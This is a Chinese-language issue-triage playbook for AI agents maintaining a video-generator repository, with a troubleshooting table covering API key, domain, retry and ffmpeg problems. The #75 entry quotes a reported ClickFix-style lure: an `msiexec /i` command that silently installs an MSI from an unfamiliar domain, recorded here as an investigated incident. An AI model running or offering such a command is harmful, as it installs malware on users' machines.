# Issue 处理流程（初版）

> 面向对象：维护 / 开发本项目的 AI Agent
> 目标仓库：`lcy362/agnes-video-generator`
> 状态：🟢 初版可用，后续持续迭代
> 版本：v0.7 | 更新日期：2026-09-29

***

## 一、整体流程

```
查看新 Issue → 分析原因 → 与用户沟通 → 回复(标注 agent) 或 优化代码 → 周期整理 FAQ
```

## 二、详细步骤

### 1. 查看未处理的新 Issue

```bash
gh issue list --repo lcy362/agnes-video-generator --state open \
  --json number,title,createdAt,state,labels,comments
```

* 优先处理 **最近新增且未处理** 的 open issue。

* 读取 issue 正文与评论（`gh issue view <号码> --json body,comments`）。

* 初判类型：

  * **真实 Bug**：含错误信息 / 诊断数据 / 复现步骤。

  * **需求 / 建议**：功能请求、优化建议。

  * **垃圾 / 噪音**：灌水、广告、无实质内容。

### 2. 分析原因

* 结合 Issue 携带的诊断信息（v6.1 反馈自动带 `error_logs`、`/api/tasks/{id}/diagnostics`）与代码定位根因。

* 明确区分三类根因：

  | 类别     | 示例                       | 处理方向         |
  | ------ | ------------------------ | ------------ |
  | 应用 Bug | 逻辑错误、异常未捕获               | 优化代码         |
  | 外部故障   | 上游 ApiHub 偶发、DNS/网络、模型超时 | 回复说明 + 给应对建议 |
  | 使用问题   | 配置错误、域名/模型选择             | 回复引导         |

### 3. 与用户沟通

* **信息不足**：先在 Issue 上提问 / 请求补充必要信息（复现步骤、环境、日志）。

* **信息充分**：直接进入处理，无需额外沟通。

* 使用工具沟通时，涉及需要用户决策的选项用 `AskUserQuestion` 收敛。

### 4. 处理（二选一 / 或按情况组合）

* **优化代码**：确定为应用 Bug 时，按 `AGENTS.md` 的 `BugFix 工作流` 修复（定位 → 修复 → 自验 → 汇报），并更新回归测试。

* **回复用户**：外部故障 / 使用问题 / 已修复时，在 Issue 下回复结论与建议。

  * **必须标注具体实施的 Agent**（例如：`由 TraeWork 回复`），让用户与后续运维可知由谁处理。

  * 说明根因、是否需用户操作、以及可选的应对方式（如切换域名 / 模型 / 网络）。

* **垃圾噪音**：直接关闭（`gh issue close <号码>`），不展开回复。

#### 4.1 回复语言判定（回复须与用户语言一致）

**先判断该 Issue 是否使用了项目的问题反馈模板**（v6.1 反馈区预填）。判定模板特征（结构已多语言化，中英文体均出现）：正文含二级/三级小标题如 `## 诊断信息（…）` 或 `## Diagnostic Info (…)`，及 `### 复现步骤` / `### Reproduction Steps`、`### 期望行为` / `### Expected Behavior`、`#### 模型调用错误 N` / `#### Model call error N`，或多个 `模型调用错误`（`Model call error`）分组条目。

关于模板的多语言现状（代码核查 + v0.3 多语言化后的结论）：

* **前端界面文案**（`fb*` 键）与**报告/标题结构字段**（`fbRep*` 键）均走 i18n，已覆盖全部 22 种语言，`python scripts/i18n_check.py` 通过（缺一不可的是 zh 与 en）。结构字段位置：`frontend/src/utils/feedback.ts`（`buildDiagnosticReport` / `buildIssueTitle` / 截断文案）、`frontend/src/components/FeedbackPanel.vue`（`#### 模型调用错误 N` 等）。

* **具体报错文本**（`errorMessage`、`error_logs` 中的 API 错误原文、DNS 报错、ComfyUI 500 等）是**数据，不属于多语言**，不得作为语言判据。

* **v7.0 起报告新增「界面语言 / UI Language」行**（`fbRepUiLang` 键，由 `frontend/src/utils/feedback.ts::buildDiagnosticReport` 写入，取值来自 `frontend/src/api/langHeader.ts::getUiLang()`）。该行是**用户 UI 语言的最强指示**，优先级高于模板结构字段语言。维护者据此可直接判定回复语种，无需再从结构字段反推。

* **v7.0 起后端用户可见消息按 UI 语言返回**（`core/i18n_backend.py` + `web/middleware.py::LangContextMiddleware`，详见 `docs/plans/v7.0/backend_i18n_plan.md`）。此前 `utils/network.py::describe_network_error`、`API_KEY_MISSING_MSG`、任务排队/中断提示等是硬编码中文，英文界面用户也照看不误（issue #64 的真实成因）。修复后：
  - 前端在所有 `fetch` 上注入 `X-Agnes-UI-Lang` 头（全局 patch，`frontend/src/api/fetchPatch.ts`）；
  - 任务创建时把语言快照落盘到 `BaseTaskState.ui_language`，异步 Pipeline 全生命周期用它发消息；
  - **因此 `errorMessage` 里出现中文不再等于「用户是中文界面」**——v7.0 之前创建的旧任务、或用户中途切了语言但任务已落盘旧快照时，仍可能出现语种与界面不一致。判定时以报告的「界面语言」行为准，`errorMessage` 语种仅作参考。

**据此分两种情况判定用户语言：**

* **情况 A：用户采用了反馈模板**。

  * **首选信号（v7.0 起）：报告里的「界面语言 / UI Language」行**。该行由前端直接写入用户当前 UI 语言代码（如 `en` / `zh` / `ja`），是最强指示，无需推断。

  * **次选信号：模板结构字段语言**。多语言化后结构随用户界面语言变化（如 `## Diagnostic Info (Agnes Video Generator)` 表明英文界面、`## 诊断信息（Agnes Video Generator）` 表明中文界面）。当报告缺「界面语言」行（v7.0 之前的旧版本）时以此为准。**⚠️ 但结构字段语言不可单独采信**：部分语言包把 `fbRep*` 键的值直接复制了英文未译（v6.4.7 / v7.0 的 `ar.json` 即如此，`fbRepTitle` / `fbRepConfigs` / `fbRetryBtn` 全为英文，而 `tiWidth` 等内容键是真阿语），此时英文结构 ≠ 英文界面（issue #65 实为阿语界面）。必须用 Key Configs 条目里来自 `ti*` 等**真翻译键**的内容标签交叉验证——这类键通常已本地化，其语言才是界面语言的可靠证据；两者冲突时以内容标签语言为准。

  * **辅助信号**：用户在 `### 复现步骤` / `### 期望行为` 中填写的真实内容、正文 / 评论追加描述。

  * ⚠️ **`errorMessage` 里的中文不能作为「用户是中文界面」的证据**：v7.0 之前后端消息硬编码中文（issue #64），英文界面用户也会收到中文诊断。判定语种只看上面三个信号，报错文本一律当数据。

  * 若用户自行填写的字段皆空、仅剩结构与报错 → 以「界面语言」行（或结构语言）为准回复，并在开头补一句「如你需要，我可以改用英文 / 中文回复」（或按用户其余行为推断）。

* **情况 B：用户自行反馈（未用模板、或自由书写）** → 直接以用户正文 / 评论输入的语言作为实际语言回复。

> 例外：Issue 正文或评论若为纯广告 / 灌水（垃圾噪音），不适用语言规则，按第 4 节直接关闭。

### 5. 定期整理常见问题 → 完善官网 FAQ

* 每次处理后，把**有复用价值的常见问题**沉淀到归档列表（见下节）。

* **周期性**（建议按版本或每月）将累积问题整理进官网 FAQ：

  * 中文：`docs/public/faq.md`；英文：`docs/public/faq.zh.md`（英文为中文翻译版）。

  * 遵守多语言规范，FAQ 文案不得硬编码。

* 同类问题重复出现 = FAQ 缺失或应对不当的信号，优先补齐。

***

## 三、常见问题归档（滚动维护）

> 处理每一条 Issue 后，如属可复现或有代表性，追加到本表；达到一定规模或到周期时统一写入官网 FAQ。

| 现象                                                                                                                                                                      | 根因                                                                                                            | 应对                                                                                                         | 关联 Issue |
| ----------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------- | ---------------------------------------------------------------------------------------------------------- | -------- |
| （示例）视频生成报 `ComfyUI inference timeout` / 连接 `apihub.agnes-ai.cn` 失败                                                                                                      | 上游偶发超时 + 域名间歇不可达                                                                                              | 稍后重试；切换域名 cn/com；更换视频模型                                                                                    | #31      |
| 视频提交报 `HTTP 403 insufficient_user_quota`（预扣费额度不足）                                                                                                                       | 上游 Agnes 账户余额 < 本次视频预扣金额                                                                                      | 充值/增加账户额度后重试；缩短时长/降低分辨率降低单次成本；不需要可删除任务                                                                     | #34      |
| （待确认）Windows 下 `scene_prompts` 步骤报 `[WinError 2] The system cannot find the file specified`                                                                             | 该步骤仅 LLM 调用，疑为环境问题：SSL CA/证书包缺失、SSL DLL 缺失，或 HTTP(S)\_PROXY / REQUESTS\_CA\_BUNDLE / SSL\_CERT\_FILE 指向不存在的路径 | 待用户补充完整 traceback 与部署方式、环境变量后定位                                                                            | #35      |
| 国内站域名应为 `api.agnes-ai.cn` 而非 `apihub.agnes-ai.cn`                                                                                                                       | Agnes 官方域名划分：国内站（中国站）= `api.agnes-ai.cn/v1`，`apihub.agnes-ai.cn` 仅作国际站备用（实测两者同一 IP、均可访问）                      | `core/config.py` `AGNES_DOMAIN_MAP["cn"]` 已改为 `api.agnes-ai.cn` + 前端域名选择区同步更新（v6.x）                        | #37      |
| 请求报 `HTTP 401` / `无效的令牌`（含 `api.agnes-ai.cn/v1`、simple/manuscript 提交、creative `scene_config` 编剧 LLM 调用等） | API Key 与请求域名不匹配：跨站 key（国际站 key 用国内站专属域名 `api.agnes-ai.cn`，或反之）认证失败；亦可能 key 过期/抄写不完整（含首尾空格） | 升级 v6.4.2：per-key 域名绑定 + 「自动探测域名」按钮逐 key 补全匹配域名；国际站 key 用 `apihub.agnes-ai.com` 或 `cn_bak` 兜底（兼容国内/国际 key）。注意：**env/`.env` 来源的 key 不参与探测**（无法持久化域名，只走全局默认域名），需在 Web 配置页添加 key 或将全局默认域名切到与 key 站点一致。**`AGNES_API_KEY` 系统环境变量优先级高于 `.env`**（`core/config.py::_collect_env_keys`），设过环境变量的人改 `.env` 完全不生效，这是「换了两把 key 都不行」的常见真因。Docker 用户注意：改 `.env` 后须 `docker compose up -d --force-recreate` 重建容器（`restart` 不重读 `.env`）。自查口径：`GET {root}/v1/models` 带 Bearer key，200 的域名即该 key 的匹配站点（与 `_probe_domain` 同一条请求），三站全 401 = key 本身失效/抄错。**若同时存在 env key 与 Web key 会一起轮换**，一把不匹配就间歇性 401，排查期建议只留一把 | #38, #44, #58, #61, #62, #72, #73, #74(discussion) |
| 生成参考图后下载报 `platform-outputs.agnes-ai.space` SSL 中断（`SSLEOFError: UNEXPECTED_EOF_WHILE_READING`）或 DNS 失败（`Errno 11001 getaddrinfo failed`），creative/manuscript init 环节失败 | 上游图片文件服务域名 `platform-outputs.agnes-ai.space` 偶发不可达 / 本机 DNS、代理、VPN 或防火墙拦截                                     | 稍后重试；刷新 DNS / 换 DNS（如 223.5.5.5）；检查代理与防火墙；应用内置 3 次下载重试（间隔 3s）                                              | #45, #46 |
| creative 跑到最后才失败，视频下载环节报 `socket.gaierror [Errno 11004] getaddrinfo failed` 解析不了 `cos-platform-outputs.agnes-ai.cn`；反馈里「失败环节」却显示 `scene_config` | 本机 DNS / 代理 / 安全软件解析不到视频输出域名（腾讯云 COS）。实测 issue 里的 mp4 URL 返回 HTTP 206、文件完整，服务端已生成成功。环节名失真是另一回事：反馈面板取页面挂载时的 `current_step` 快照，且终态进度写入被 0.5s 节流丢弃 | 换能解析该域名的 DNS（223.5.5.5 / 119.29.29.29）、关 VPN/代理 DNS 劫持与 hosts/安全软件拦截、`ipconfig /flushdns` 后点「重试任务」续传（video id 已保留，不重复提交）；v6.4.8 已修：网络类异常翻译为「网络诊断」提示、失败终态强制落盘并保留真实环节、报告改用实时环节名 | #56, #57 |
| 视频提交持续报 `HTTP 503 server error` → `max retries (5) exceeded`，或 `HTTP 429 rate limited`，随后轮询返回 `job cancelled`                                                           | 上游视频服务过载 / 限流，提交重试耗尽且任务被上游取消                                                                                  | 错峰稍后重试；降低并发生成以减少限流；必要时更换视频模型 / 域名                                                                          | #47      |
| 视频提交返回 `{"code":"video_queue_full","message":"video queue is full, please retry later"}`，错误面板直接显示这段原始 JSON                                                                                                              | 上游视频服务队列饱和（与 #47 的 503 / 429 同族容量问题），请求在入队前就被拒。应用当前的自动重试只覆盖 HTTP 429 与 5xx（`core/api/agnes_video.py`），该业务错误码不在其中，因此立即硬失败；前端 `feedback.ts` 的 `HTTP 40[0-4]` 预筛还会把它误判为「确定性故障」，给出「重试无效」的错误引导 | 等几分钟错峰重试；长任务点「重试任务」续传（已生成片段保留 video id，不重复提交）；降时长/分辨率或换视频模型；多 Key 可线性提升配额，或用 `AGNES_VIDEO_RATE_LIMIT` 主动放慢提交；持续失败再附 `GET /api/tasks/{id}/diagnostics` 反馈。**已记录为已知缺口**（瞬态业务码应纳入退避重试 + 前端不应归类为确定性故障），本轮按外部故障处理，未改代码 | #63      |
| Issue 正文只有一段视频提示词（无报错、无环境、无复现步骤，标题多为乱码或 "first"），期望维护者代跑生成                                                                                             | 用户把开源仓库的 Issue 当成在线生成入口；本项目是**自托管工具**，服务端不代用户执行任务                                                | 按垃圾噪音关闭（`--reason "not planned"`，不展开回复）；已补 FAQ 双语条目「贴提示词到 Issue 能生成视频吗」+ `.github/ISSUE_TEMPLATE/config.yml` 的 contact_links 指向本地部署与官网在线体验 | #39, #41, #48, #51, #52, #67 |
| 桌面版长视频（creative/manuscript）里角色不开口说话，只有一段旁白；而网页在线版能看到角色原声 | 流水线默认跑 TTS 旁白（narration）+ 字幕叠加，`concat_videos_with_audio_overlay` 用旁白/静音轨覆盖并替换掉视频模型自带音频 | 关闭「启用旁白配音」（Audio → Enable narration=off），并尽量同时关字幕，让每个片段保留模型生成音；在视频提示词里直接描述角色说话（"the character says, '…'"）驱动模型自带口型与声音。注意：Agnes 视频模型自带音频质量/口型弱于画面，长多场景视频尤甚，属模型限制；要清晰台词仍用 TTS 旁白更稳 | #58 |
| manuscript 任务在 `video_gen` 失败，`errorMessage` 是一段中文「网络诊断：本机无法连接到 …（连接被拒绝或被拦截）」，但报告结构字段（`## Diagnostic Info` / `### Reproduction Steps`）是英文，用户实为英文界面 | 两层原因：(1) 本机到 Agnes 视频域名的 TLS 握手被对端 reset（`ConnectionResetError: [Errno 54] Connection reset by peer`），属本地网络/代理/防火墙拦截，非服务侧故障；(2) 后端 `utils/network.py::describe_network_error` 此前硬编码中文，英文 UI 用户也收到中文诊断，看不懂又误判为服务 bug | 网络侧：关代理/VPN 后重试、换直连或热点验证、把 `*.agnes-ai.cn` 加白，恢复后点「重试任务」从 `video_gen` 续传（已生成分镜不重跑）。代码侧：v7.0 已修——新增 `core/i18n_backend.py` + `LangContextMiddleware`，前端全局注入 `X-Agnes-UI-Lang`，任务落盘 `ui_language` 快照，`describe_network_error` / `API_KEY_MISSING_MSG` / 排队/中断/模式切换等消息按 UI 语言返回中英双语；`_CONNECT_MARKERS` 补 `connection reset` 让归因更稳；诊断报告新增「界面语言」行。剩余进度/校验消息已于 2026-09-24 收尾批次全部清除（见 `docs/plans/v7.0/backend_i18n_plan.md` §三） | #64 |
| creative 任务在 `scene_config` 失败（v6.4.7），`errorMessage` 为中文「图片分析失败（Start Frame）: … SSLError … certificate is not yet valid」，请求 `apihub.agnes-ai.com/v1/chat/completions` 多次重试均败 | 客户端证书时间校验失败：`apihub.agnes-ai.com` 证书当日刚轮换（notBefore=2026-09-23 10:35 UTC），用户 Windows 时钟落后/时区错或 HTTPS 拦截类安全软件给出无效日期证书，即报 `CERTIFICATE_VERIFY_FAILED: not yet valid`。失败发生在 Start Frame 图片多模态分析（`core/screenwriter/__init__.py::_describe_with_retry`），视频未提交、无消耗。另注：该中文前缀是后端硬编码消息（v7.0 未覆盖，属 §三 剩余消息），且报告结构字段为英文而用户实为阿语界面（`ar.json` 的 `fbRep*` 值未译），印证 §4.1 语言判定新陷阱 | 引导：开启系统时间自动同步（`w32tm /resync`）+ 校准时区；关代理/VPN/杀软 HTTPS 扫描或加白 `*.agnes-ai.*`；恢复后点 Retry Task 从失败步骤续传。已按环境故障阿语+英语双语回复（标注 agent）。代码侧：`_describe_with_retry` 的「图片分析失败」等 screenwriter 消息与其余 ~120 条后端硬编码中文已于 2026-09-24 收尾批次全部纳入 backend i18n（见 `docs/plans/v7.0/backend_i18n_plan.md` §三）；仍待办：`ar.json` 等语言包 `fbRep*` 需真正翻译（i18n_check 只查键存在，查不出英文占位值） | #65 |
| manuscript 任务 `scene_prompts` 失败，App 7.0.0 / **UI Language: en**，`errorMessage` 却是中文「稿件场景描述生成全部失败 48 段…原因: 401 Client Error: Unauthorized」（48 段 LLM 调用全部 401） | 两层：(1) **401 本体**＝Key 未通过认证，属既有关联条目同族（跨站 Key 与域名不匹配：国际站域名 `apihub.agnes-ai.com` 配国内站 Key 或反之；env/`.env` 来源 Key 不参与 per-key 域名绑定只走全局默认域名；Key 过期/抄写不完整），任务未产出、无消耗；(2) **中文消息**＝v7.0.0 该消息仍硬编码中文（P1 收尾批次修复项），随 v7.0.1 发布——本条即 §4.1 新机制的首个实战验证：报告「界面语言」行（v7.0.0 起有）为判定依据，中文 `errorMessage` 仅作数据，据此以**英文**回复 | 引导：升级到 v7.0.1（同错误在英文界面渲染为 "All 48 manuscript scene descriptions failed…"）；Web 配置页重加 Key 用「自动探测域名」或把全局默认域名切到与 Key 站点一致；恢复后 Retry Task 从 `scene_prompts` 续传。已英文回复（标注 agent）。顺带修正：仓库内 GHCR 嵌套路径 `ghcr.io/lcy362/agnes-video-generator/free-short-video` 从未存在（registry 403），已全部改为实际平铺路径 `ghcr.io/lcy362/free-short-video`（GitHub Release body 由 CI 模板生成、本就正确） | #66 |
| creative 任务在 `audio` 失败（v6.5.0 / Windows），`errorMessage` 仅 `[WinError 2] The system cannot find the file specified`，报告结构为英文但 Key Configs 的 Style 值是中文「电影质感写实风格」 | **应用 Bug（待修）**：`core/audio/tts.py` SilentTTSEngine 用裸 `"ffmpeg"` 经 `asyncio.create_subprocess_exec` 起子进程，未走 `core/compositor/ffmpeg_tool.resolve_ffmpeg()` 统一解析（该机制 v6.4.1 为修 #36 而建，TTS 这条漏网）。Windows 无系统 ffmpeg 时 CreateProcess 抛 [WinError 2]。触发：关旁白（Silent 落盘）或 EdgeTTS 失败降级。同族待修共 7 处：`tts.py:175`（崩溃点）＋ 4 处裸 `"ffprobe"` 探测（`pipelines/__init__.py:526` get_audio_duration、`poetry_video.py:362/380`、`watermark.py:66`，失败静默降级 0.0/None/False）＋ 2 处裸 `"ffmpeg"`（`creative/steps_video.py:361/470` last-frame 提取与尾帧归一化，同样会崩） | 引导装 ffmpeg（`winget install Gyan.FFmpeg` 或官网下载加 PATH）后「重试任务」续传；**代码侧已于 2026-09-29 修复**：7 处全部收口——新增 `ffmpeg_tool.resolve_cmd_binary()`（把命令首元素裸 `ffmpeg`/`ffprobe` 换成解析后绝对路径，解析不到抛 i18n 文案 `error.ffmpeg_missing`）＋ `probe_duration()` / `has_audio_stream()` / `probe_video_dimensions()`（均为 **ffprobe → ffmpeg stderr 兜底 → default**，`ffprobe` 缺失不再静默降级），`_run_ffmpeg_async` 与 `BasePipeline.run_ffmpeg_async` 接前者，`tts.py` 崩溃点无二进制时抛中英双语错误。**语言判定教训（§4.1 新变体）**：v6.5.0 时代全部 20 个非中英语言包 `fbRep*` 均为英文占位（结构语言无法区分 en 与其余 19 种），zh 包当时已是完整中文——「英文结构」直接排除 zh 界面；而中文表单值（styleDefault 等输入框内容）来源不可靠（手输/早前会话残留/建任务后切语言），不得反向当作 zh 界面证据。本条以英文回复 | #78 |
| simple 任务 i2v 提交即失败（v6.4.7），`HTTP 403 insufficient_user_quota`（"remaining: ＄0.000000"），traceback 显示走 `_submit_video_v25`（Video 2.5 Flash） | 上游模型已形成免费/付费分层：2.5 Flash 为**付费模型**、按账户余额扣费，余额 $0 在提交时即被拒；与提示词/参数无关。#34 同族的新变体：当时归因「预扣费额度不足」，本轮明确为「选了付费模型＋余额为零」，引导方式从「充值」改为「换免费模型」 | 引导在任务设置里把视频模型切到免费档 `agnes-video-v2.0` 重新提交（无需充值）；确需 2.5 Flash 再充值。英文回复（结构语言判定，无冲突内容键） | #79 |
| #75（demo 超时议题）新评论：用户称在 `video.lichuanyang.top/es/demo` 被要求以「验证」为名运行 `msiexec /i http://bicyclyn16.top/... /qn`（静默安装陌生域 MSI，ClickFix 假验证特征） | 站点代码排查干净（线上 HTML 无注入脚本/iframe，demo 无「运行命令」逻辑），非站点被入侵。两个并列假设：**A**＝页面第三方广告创意（页面实证挂载 Adsterra Social Bar＋AdSense，创意由广告网络动态决定、站方不可审计）；**B**＝用户本地环境（恶意扩展/流氓根证书 MITM；纯 DNS 劫持在 HTTPS 下会证书报错，概率低）。仅一例报告，无法定论。注意：popunder 2026-07-08 移除属广告体验原因，与恶意内容无关，不可作佐证 | 按平铺口径英文回复：确认「不正常」＋demo 从不要求运行命令＋A/B 两假设并列（不用「恶意」措辞，A 表述为「可能是广告行为」）＋承诺向广告服务商求证＋留区分性问题（页面内弹层 vs 独立弹窗）。**待办（维护者）**：向 Adsterra/AdSense 后台询问是否有「验证」类创意；若多用户报告同现象且集中于挂广告页面→处理广告位；FAQ 可补「官网/demo 绝不要求运行命令」条目 | #75 |
| creative 任务在 `video_gen` 失败（7.0.0 / 6.4.5 / Windows），`errorMessage` 为 `[AgnesVideo] reference (2 images, keyframe fallback): max retries (5) exceeded`；#81 附完整 traceback 与 8 条 `Model call error`，**全部为 `HTTP 503` 且 body 无 `code`** | 上游视频服务过载/队列饱和，属#47/#63 同族的**新变体：裸 503**。`core/api/agnes_video.py::_submit_with_retry` 的 v7.0 U1 队列轨道只在 body `code` 命中 `_QUEUE_FULL_CODES`（`video_queue_full` / `fail_to_fetch_task`）时启用；**body 无 code 的裸 503 落入普通 `>= 500` 分支**，只享 5 次退避（`retry_base_delay=30` → 30/60/90/120/150s ≈ 5.5 分钟）。#81 时间戳（20:09:08→20:09:38→20:10:39→20:12:09→20:14:10→20:16:40，间隔 30/60/90/120/150s）精确吻合该序列，证实走的是普通配额而非队列轨道。而 `docs/dev/agnes_video_upstream_behavior.md` §4 实测队列饱和**可持续 12 分钟以上**——即应用会在「再等一分钟就能排上」时提前放弃。被拒不创建任务、不消耗配额，可安全重试。另注：#81 标题「Failed Step: scene_config」与 traceback 实际 `video_gen` 不符，是反馈面板环节名失真老问题（#56/#57 同族，v6.4.8 已部分修），本例 traceback 更可信 | 引导：错峰重试（免费队列高峰为欧美与亚洲工作时段）；点「重试任务」从失败步骤续传（已生成场景保留，不重复提交）；降时长/分辨率减少单次占用；换视频模型（队列按模型分池）；多 Key 提升配额。已英文回复 #80/#81/#83（标注 agent）。**代码侧本轮按外部故障处理，未改代码——已记录为待办缺口：裸 503 应比照队列满纳入长预算轨道（`AGNES_VIDEO_QUEUE_RETRY_SECONDS`，默认 900s），而非 5 次普通配额** | #80, #81, #83 |
| creative 任务在 `story` 失败（7.0.5 / npx 部署 / Windows），`errorMessage` 为 `401 Client Error: Unauthorized for url: https://api.agnes-ai.cn/v1/chat/completions`，报告 **UI Language: en** | 既有 401 同族（#38/#44/#58/#61/#62/#72/#73）的**npx 部署新变体**：请求打到国内站域名 `api.agnes-ai.cn`（`AGNES_DOMAIN_MAP["cn"]`）而被拒，即 Key 与域名不匹配（国际站 Key 配国内站域名或反之）。**npx 特有的放大因素**：`core/config.py` 的 `CONFIG_DIR` 硬编码为包目录内 `.agnes_config`（`os.path.dirname(os.path.dirname(__file__))`），npx 场景下包解包在 `AppData\Local\npm-cache\_npx\<hash>\node_modules\free-short-video\`，**配置与 Key 落在 npm 缓存里**——`npm cache clean` 或 npm 换了缓存目录（hash 变化）即丢配置并回退默认域名（`_DEFAULT_DOMAIN = "com"`），用户可能在无感知情况下回到错误域名。env 变量优先级高于 `.env`（`_collect_env_keys`）的老问题依旧适用 | 引导：Web 配置页删掉旧 Key 后用「自动探测域名」逐 key 绑定（200 的域名即匹配站点，三站全 401 = Key 本身失效/抄写带头尾空格）；自查 `GET {root}/v1/models` 带 Bearer；排查 `AGNES_API_KEY` 系统环境变量（优先级最高，设过则 Web 配置不生效）；排查期只留一把 Key（多 Key 会一起轮换，一把不匹配即间歇 401）；恢复后 Retry Task 从 `story` 续传。已英文回复（UI Language: en 判定；Style 值中文不作为语言依据）。回复中额外提示 npx 配置随 npm 缓存丢失的风险。**潜在改进（未落代码）**：`CONFIG_DIR` 支持环境变量覆盖 / npx 场景改用用户级配置目录，可列入 v7.1 待办 | #82 |
| creative 任务在 `video_gen` 失败（**7.0.1** / Windows），`errorMessage` 为 `[AgnesVideo] reference (2 images, keyframe fallback): max retries (5) exceeded`；报告 **UI Language: en**，11 场景 / 1152×768 / keyframes，`Retry Count: 2`，18 条 `Model call error` **全部为 `HTTP 503` 且 body 无 `code`**（22:10:24→22:11:26→22:12:27→22:13:58→22:15:58，间隔 62/61/91/120s），并出现 3 次 `RetriesExhausted`（原始 + 用户两次手动重试，每次重开约 5.5 分钟配额） | 与 #80/#81/#83 **同一条已记录缺口**（裸 503 落入普通 `>= 500` 分支，仅 5 次退避 ≈5.5 分钟；实测队列饱和可持续 12 分钟以上），本轮仍按外部故障处理。用户版本 7.0.1 已含 v7.0 U1 队列轨道，但该轨道只在 body `code` ∈ `_QUEUE_FULL_CODES` 时启用，**裸 503 不受益**——即「升级到 7.0」不足以覆盖本例，回复中未再承诺升级可解 | 英文回复（UI Language: en）：确认上游容量问题＋未创建任务/未消耗配额＋设置有效；显式说明「裸 503 走标准 5 次预算、约 5.5 分钟即放弃，属已知缺口、正在跟踪」；引导错峰重试、Retry Task 续传、降载（更少场景/更短时长/更小分辨率）、换视频模型、多 Key。**代码侧仍未改**：裸 503 应比照队列满纳入长预算轨道（`AGNES_VIDEO_QUEUE_RETRY_SECONDS`，默认 900s）——待办缺口持续累积（#80/#81/#83/#84 已 4 例） | #84 |
| creative 任务在 `video_gen` 失败（**7.0.5** / Windows），`errorMessage` 为 `Agnes video submit failed (HTTP 401): {"error":{"code":"","message":"Invalid token (request id: ...)","type":"AgnesAI_error"}}`；报告 **UI Language: en**，5 场景 / 768×1152 / keyframes，`Retry Count: 0`。同任务前序 `Model call error` 为**图片侧** `apihub.agnes-ai.com` 的 `ReadTimeout`(120s) + 2 次 `HTTP 503 server error` | 既有 401 同族（#38/#44/#58/#61/#62/#72/#73/#82）的**视频提交新变体**，且首次出现「同任务图片能过、视频 401」的混合指纹：**关键证据**是图片侧拿到的是 503/超时（服务繁忙，**认证已通过**），说明 Key 池中至少一把 Key 在国际站 `apihub.agnes-ai.com` 可用；紧接着的视频提交却 401。代码核查确认根因：`core/api/key_manager.py::KeyRing.next()` 对**所有已配置 Key 做 round-robin**，图片与视频共用同一 KeyRing；`core/config.py::get_base_url_for_key()` 对**未绑定域名的 Key（含 env / `.env` 来源，`_collect_env_keys` 优先级高于 `.env`）回退全局 `agnes_domain`**。因此在「池内含国内站 Key + 全局域名为国际站」时，国内站 Key 被发往国际站域名 → `Invalid token`，而另一把 Key 继续服务图片调用 → 正是本例「一次服务繁忙、下一次硬 401」的交错现象。另注：`_submit_with_retry` 对 **401 不做换 Key 重试**（仅 429 走 `ring.rotate()`），直接落入通用分支 `raise RuntimeError`（`agnes_video.py:794-805`），故一把坏 Key 即可打死健康任务 | 英文回复（UI Language: en）：401 = 请求所带 Key 未被该域名接受、未生成未消耗；解释两站独立 Key 空间 + env/.env Key 不参与 per-key 域名绑定 + round-robin 混池是「图片能过、视频 401」的成因。引导：排查期**只留一把 Key**；Web 配置页用「自动探测域名」重绑；排查 `AGNES_API_KEY`（优先级最高）；自查 `GET {root}/v1/models` 带 Bearer（200 即匹配站点，三站全 401 = Key 失效/带头尾空格）；修复后 Retry Task 从 `video_gen` 续传（分镜与已生成图片保留）。**新增待办（未落代码）**：401 应比照 429 尝试换 Key 重试（或至少逐 Key 探测后剔除失效 Key），否则混池中一把 stale Key 会随机打死任务 | #86 |

***

## 四、范围与后续迭代

* **本版为初版**：先跑通「查看 → 分析 → 沟通 → 回复/修复 → 归档」闭环，最小可落地。

* **后续可迭代方向**（未实现，仅记录）：

  * 自动化：定期扫描 open issue 并生成待处理清单。

  * 分类机器人：为 issue 打标签（bug / 需求 / spam）。

  * 处理 SLA 与升级机制。

  * 从归档表自动生成 FAQ 草稿。

